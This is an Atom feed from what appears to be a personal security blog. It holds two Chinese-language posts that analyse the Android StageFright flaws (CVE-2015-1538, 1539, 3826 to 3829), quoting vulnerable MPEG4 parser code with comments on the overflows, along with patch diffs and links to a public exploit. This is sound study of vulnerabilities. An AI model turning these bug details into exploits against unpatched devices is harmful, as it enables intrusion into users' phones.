<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ssj&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/Cracke-S-J/"/>
  <updated>2020-05-31T06:50:20.405Z</updated>
  <id>https://github.com/Cracke-S-J/</id>
  
  <author>
    <name>ssj</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>StageFright 系列漏洞（二——五）</title>
    <link href="https://github.com/Cracke-S-J/2020/05/30/StageFright-%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%E2%80%94%E2%80%94%E4%BA%94%EF%BC%89/"/>
    <id>https://github.com/Cracke-S-J/2020/05/30/StageFright-%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%E2%80%94%E2%80%94%E4%BA%94%EF%BC%89/</id>
    <published>2020-05-30T15:38:26.000Z</published>
    <updated>2020-05-31T06:50:20.405Z</updated>
    
    <content type="html"><![CDATA[<h2 id="二-CVE-2015-3828-CVE-2015-3826"><a href="#二-CVE-2015-3828-CVE-2015-3826" class="headerlink" title="二 CVE-2015-3828 / CVE-2015-3826"></a>二 CVE-2015-3828 / CVE-2015-3826</h2><p>在<code>status_t MPEG4Extractor::parse3GPPMetaData(off64_t offset, size_t size, int depth)</code>这个函数中，有一个翻车的整数越界：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (metadataKey &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">bool</span> isUTF8 = <span class="literal">true</span>; <span class="comment">// Common case</span></span><br><span class="line">    <span class="keyword">char16_t</span> *framedata = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> len16 = <span class="number">0</span>; <span class="comment">// Number of UTF-16 characters</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size - <span class="number">6</span> &gt;= <span class="number">4</span>) &#123;                <span class="comment">// &lt;-- 这里，如果size是个负数</span></span><br><span class="line">        len16 = ((size - <span class="number">6</span>) / <span class="number">2</span>) - <span class="number">1</span>;   <span class="comment">// don't include 0x0000 terminator</span></span><br><span class="line">        framedata = (<span class="keyword">char16_t</span> *)(buffer + <span class="number">6</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0xfffe</span> == *framedata) &#123;</span><br><span class="line">            <span class="comment">// endianness marker (BOM) doesn't match host endianness</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len16; i++) &#123;</span><br><span class="line">                framedata[i] = bswap_16(framedata[i]);      <span class="comment">// &lt;-- 这里，越界，越界大小端转换</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// BOM is now swapped to 0xfeff, we will execute next block too</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0xfeff</span> == *framedata) &#123;</span><br><span class="line">            <span class="comment">// Remove the BOM</span></span><br><span class="line">            framedata++;</span><br><span class="line">            len16--;</span><br><span class="line">            isUTF8 = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// else normal non-zero-length UTF-8 string</span></span><br><span class="line">        <span class="comment">// we can't handle UTF-16 without BOM as there is no other</span></span><br><span class="line">        <span class="comment">// indication of encoding.</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (isUTF8) &#123;</span><br><span class="line">        mFileMetaData-&gt;setCString(metadataKey, (<span class="keyword">const</span> <span class="keyword">char</span> *)buffer + <span class="number">6</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Convert from UTF-16 string to UTF-8 string.</span></span><br><span class="line">        String8 tmpUTF8str(framedata, len16);               <span class="comment">// &lt;-- 这里应该没问题</span></span><br><span class="line">        mFileMetaData-&gt;setCString(metadataKey, tmpUTF8str.<span class="built_in">string</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三-CVE-2015-3827"><a href="#三-CVE-2015-3827" class="headerlink" title="三 CVE-2015-3827"></a>三 CVE-2015-3827</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">case FOURCC('c', 'o', 'v', 'r'):</span><br><span class="line">&#123;</span><br><span class="line">    *offset += chunk_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mFileMetaData != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        ALOGV(<span class="string">"chunk_data_size = %lld and data_offset = %lld"</span>,</span><br><span class="line">                chunk_data_size, data_offset);</span><br><span class="line"></span><br><span class="line">        sp&lt;ABuffer&gt; buffer = <span class="keyword">new</span> ABuffer(chunk_data_size + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (mDataSource-&gt;readAt(</span><br><span class="line">            data_offset, buffer-&gt;data(), chunk_data_size) != (<span class="keyword">ssize_t</span>)chunk_data_size) &#123;</span><br><span class="line">            <span class="keyword">return</span> ERROR_IO;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">int</span> kSkipBytesOfDataBox = <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 这里没有判断 chunk_data_size 和 16 的大小，溢出</span></span><br><span class="line">        mFileMetaData-&gt;setData(</span><br><span class="line">            kKeyAlbumArt, MetaData::TYPE_NONE,</span><br><span class="line">            buffer-&gt;data() + kSkipBytesOfDataBox, chunk_data_size - kSkipBytesOfDataBox);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> MetaData::typed_data::setData(</span><br><span class="line">        <span class="keyword">uint32_t</span> type, <span class="keyword">const</span> <span class="keyword">void</span> *data, <span class="keyword">size_t</span> size) &#123;</span><br><span class="line">    clear();</span><br><span class="line"></span><br><span class="line">    mType = type;</span><br><span class="line">    allocateStorage(size);</span><br><span class="line">    <span class="built_in">memcpy</span>(storage(), data, size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回溯一下，看chunk_data_size来自哪：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">off64_t</span> chunk_data_size = *offset + chunk_size - data_offset;</span><br></pre></td></tr></table></figure><p>chunk_size的值&lt;=24会触发漏洞。</p><h2 id="四-CVE-2015-3829"><a href="#四-CVE-2015-3829" class="headerlink" title="四 CVE-2015-3829"></a>四 CVE-2015-3829</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">case FOURCC('c', 'o', 'v', 'r'):</span><br><span class="line">&#123;</span><br><span class="line">    *offset += chunk_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mFileMetaData != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        ALOGV(<span class="string">"chunk_data_size = %lld and data_offset = %lld"</span>,</span><br><span class="line">                chunk_data_size, data_offset);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// patch</span></span><br><span class="line">        <span class="comment">// if (chunk_data_size &gt;= SIZE_MAX - 1) &#123;</span></span><br><span class="line">        <span class="comment">//     return ERROR_MALFORMED;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="comment">// 如果chunk_data_size + 1 &gt;= SIZE_MAX的话</span></span><br><span class="line">        <span class="comment">// 这里长度分配为零或者分配的比较小，就空指针引用或者越界操作了</span></span><br><span class="line">        sp&lt;ABuffer&gt; buffer = <span class="keyword">new</span> ABuffer(chunk_data_size + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (mDataSource-&gt;readAt(</span><br><span class="line">            data_offset, buffer-&gt;data(), chunk_data_size) != (<span class="keyword">ssize_t</span>)chunk_data_size) &#123;</span><br><span class="line">            <span class="keyword">return</span> ERROR_IO;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">int</span> kSkipBytesOfDataBox = <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">if</span> (chunk_data_size &lt;= kSkipBytesOfDataBox) &#123;</span><br><span class="line">            <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mFileMetaData-&gt;setData(</span><br><span class="line">            kKeyAlbumArt, MetaData::TYPE_NONE,</span><br><span class="line">            buffer-&gt;data() + kSkipBytesOfDataBox, chunk_data_size - kSkipBytesOfDataBox);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="五-CVE-2015-1539"><a href="#五-CVE-2015-1539" class="headerlink" title="五 CVE-2015-1539"></a>五 CVE-2015-1539</h2><p>这里 -= 2 的时候有溢出：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">status_t</span> ESDS::parseESDescriptor(<span class="keyword">size_t</span> offset, <span class="keyword">size_t</span> size) &#123;</span><br><span class="line">    <span class="keyword">if</span> (size &lt; <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    offset += <span class="number">2</span>;  <span class="comment">// skip ES_ID</span></span><br><span class="line">    size -= <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> streamDependenceFlag = mData[offset] &amp; <span class="number">0x80</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> URL_Flag = mData[offset] &amp; <span class="number">0x40</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> OCRstreamFlag = mData[offset] &amp; <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">    ++offset;</span><br><span class="line">    --size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (streamDependenceFlag) &#123;</span><br><span class="line">        <span class="keyword">if</span> (size &lt; <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">        offset += <span class="number">2</span>;</span><br><span class="line">        size -= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>根据patch来看，还有几处：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">@@ <span class="number">-136</span>,<span class="number">6</span> +<span class="number">136</span>,<span class="number">8</span> @@</span><br><span class="line">    --size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (streamDependenceFlag) &#123;</span><br><span class="line">+        <span class="keyword">if</span> (size &lt; <span class="number">2</span>)</span><br><span class="line">+            <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">        offset += <span class="number">2</span>;</span><br><span class="line">        size -= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">@@ <span class="number">-145</span>,<span class="number">11</span> +<span class="number">147</span>,<span class="number">15</span> @@</span><br><span class="line">            <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">unsigned</span> URLlength = mData[offset];</span><br><span class="line">+        <span class="keyword">if</span> (URLlength &gt;= size)</span><br><span class="line">+            <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">        offset += URLlength + <span class="number">1</span>;</span><br><span class="line">        size -= URLlength + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (OCRstreamFlag) &#123;</span><br><span class="line">+        <span class="keyword">if</span> (size &lt; <span class="number">2</span>)</span><br><span class="line">+            <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">        offset += <span class="number">2</span>;</span><br><span class="line">        size -= <span class="number">2</span>;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;二-CVE-2015-3828-CVE-2015-3826&quot;&gt;&lt;a href=&quot;#二-CVE-2015-3828-CVE-2015-3826&quot; class=&quot;headerlink&quot; title=&quot;二 CVE-2015-3828 / CVE-2015-3826&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/categories/Android/"/>
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/categories/Android/CVE/"/>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/tags/Android/"/>
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>StageFright 系列漏洞（一）CVE-2015-1538</title>
    <link href="https://github.com/Cracke-S-J/2020/05/24/StageFright-%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89CVE-2015-1538/"/>
    <id>https://github.com/Cracke-S-J/2020/05/24/StageFright-%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89CVE-2015-1538/</id>
    <published>2020-05-24T15:18:33.000Z</published>
    <updated>2020-05-31T12:01:23.535Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/jduck/cve-2015-1538-1">https://github.com/jduck/cve-2015-1538-1</a></p><p><a href="https://wooyun.js.org/drops/CVE-2015-1538%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%AD%E7%9A%84Shellcode%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/CVE-2015-1538%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%AD%E7%9A%84Shellcode%E5%88%86%E6%9E%90.html</a></p><p><a href="https://www.madebug.net/static/drops/papers-7558.html" target="_blank" rel="noopener">https://www.madebug.net/static/drops/papers-7558.html</a></p><h2 id="漏洞点（误）cve编号对不上，我也不知道这个哪个cve，害"><a href="#漏洞点（误）cve编号对不上，我也不知道这个哪个cve，害" class="headerlink" title="漏洞点（误）cve编号对不上，我也不知道这个哪个cve，害"></a>漏洞点（误）cve编号对不上，我也不知道这个哪个cve，害</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">case FOURCC('t', 'i', 't', 'l'):</span><br><span class="line">case FOURCC('p', 'e', 'r', 'f'):</span><br><span class="line">case FOURCC('a', 'u', 't', 'h'):</span><br><span class="line">case FOURCC('g', 'n', 'r', 'e'):</span><br><span class="line">case FOURCC('a', 'l', 'b', 'm'):</span><br><span class="line">case FOURCC('y', 'r', 'r', 'c'):</span><br><span class="line">&#123;</span><br><span class="line">    *offset += chunk_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// invoke parse3GPPMetaData.</span></span><br><span class="line">    <span class="keyword">status_t</span> err = parse3GPPMetaData(data_offset, chunk_data_size, depth);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (err != OK) &#123;</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">status_t</span> MPEG4Extractor::parse3GPPMetaData(<span class="keyword">off64_t</span> offset, <span class="keyword">size_t</span> size, <span class="keyword">int</span> depth) &#123;</span><br><span class="line">    <span class="keyword">if</span> (size &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// size don't include 0x0000 terminator</span></span><br><span class="line">    <span class="keyword">uint8_t</span> *buffer = <span class="keyword">new</span> (<span class="built_in">std</span>::nothrow) <span class="keyword">uint8_t</span>[size];</span><br><span class="line">    <span class="keyword">if</span> (buffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mDataSource-&gt;readAt(</span><br><span class="line">                offset, buffer, size) != (<span class="keyword">ssize_t</span>)size) &#123;</span><br><span class="line">        <span class="keyword">delete</span>[] buffer;</span><br><span class="line">        buffer = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ERROR_IO;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> metadataKey = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> (mPath[depth]) &#123;</span><br><span class="line">        case FOURCC('t', 'i', 't', 'l'):</span><br><span class="line">        &#123;</span><br><span class="line">            metadataKey = kKeyTitle;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        case FOURCC('p', 'e', 'r', 'f'):</span><br><span class="line">        &#123;</span><br><span class="line">            metadataKey = kKeyArtist;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        case FOURCC('a', 'u', 't', 'h'):</span><br><span class="line">        &#123;</span><br><span class="line">            metadataKey = kKeyWriter;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        case FOURCC('g', 'n', 'r', 'e'):</span><br><span class="line">        &#123;</span><br><span class="line">            metadataKey = kKeyGenre;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        case FOURCC('a', 'l', 'b', 'm'):</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (buffer[size - <span class="number">1</span>] != <span class="string">'\0'</span>) &#123;</span><br><span class="line">              <span class="keyword">char</span> tmp[<span class="number">4</span>];</span><br><span class="line">              <span class="built_in">sprintf</span>(tmp, <span class="string">"%u"</span>, buffer[size - <span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">              mFileMetaData-&gt;setCString(kKeyCDTrackNumber, tmp);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            metadataKey = kKeyAlbum;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        case FOURCC('y', 'r', 'r', 'c'):</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> tmp[<span class="number">5</span>];</span><br><span class="line">            <span class="keyword">uint16_t</span> year = U16_AT(&amp;buffer[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (year &lt; <span class="number">10000</span>) &#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(tmp, <span class="string">"%u"</span>, year);</span><br><span class="line"></span><br><span class="line">                mFileMetaData-&gt;setCString(kKeyYear, tmp);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (metadataKey &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">bool</span> isUTF8 = <span class="literal">true</span>; <span class="comment">// Common case</span></span><br><span class="line">        <span class="keyword">char16_t</span> *framedata = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">int</span> len16 = <span class="number">0</span>; <span class="comment">// Number of UTF-16 characters</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// smallest possible valid UTF-16 string w BOM: 0xfe 0xff 0x00 0x00</span></span><br><span class="line">        <span class="keyword">if</span> (size &lt; <span class="number">6</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (size - <span class="number">6</span> &gt;= <span class="number">4</span>) &#123;</span><br><span class="line">            len16 = ((size - <span class="number">6</span>) / <span class="number">2</span>) - <span class="number">1</span>; <span class="comment">// don't include 0x0000 terminator</span></span><br><span class="line">            framedata = (<span class="keyword">char16_t</span> *)(buffer + <span class="number">6</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0xfffe</span> == *framedata) &#123;</span><br><span class="line">                <span class="comment">// endianness marker (BOM) doesn't match host endianness</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len16; i++) &#123;</span><br><span class="line">                    framedata[i] = bswap_16(framedata[i]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// BOM is now swapped to 0xfeff, we will execute next block too</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0xfeff</span> == *framedata) &#123;</span><br><span class="line">                <span class="comment">// Remove the BOM</span></span><br><span class="line">                framedata++;</span><br><span class="line">                len16--;</span><br><span class="line">                isUTF8 = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// else normal non-zero-length UTF-8 string</span></span><br><span class="line">            <span class="comment">// we can't handle UTF-16 without BOM as there is no other</span></span><br><span class="line">            <span class="comment">// indication of encoding.</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// buffer don't include 0x0000 terminator</span></span><br><span class="line">        <span class="keyword">if</span> (isUTF8) &#123;</span><br><span class="line">            mFileMetaData-&gt;setCString(metadataKey, (<span class="keyword">const</span> <span class="keyword">char</span> *)buffer + <span class="number">6</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Convert from UTF-16 string to UTF-8 string.</span></span><br><span class="line">            String8 tmpUTF8str(framedata, len16);</span><br><span class="line">            mFileMetaData-&gt;setCString(metadataKey, tmpUTF8str.<span class="built_in">string</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>[] buffer;</span><br><span class="line">    buffer = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>chunk_data_size</code>是data的长度，然而分配了个char[]没有把结尾的’\0’算进去，最后memcpy的时候也没有，导致字符串无结尾了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> MetaData::typed_data::setData(</span><br><span class="line">        <span class="keyword">uint32_t</span> type, <span class="keyword">const</span> <span class="keyword">void</span> *data, <span class="keyword">size_t</span> size) &#123;</span><br><span class="line">    clear();</span><br><span class="line"></span><br><span class="line">    mType = type;</span><br><span class="line">    allocateStorage(size);</span><br><span class="line">    <span class="built_in">memcpy</span>(storage(), data, size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>storage()是个这个，copy到这上面了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 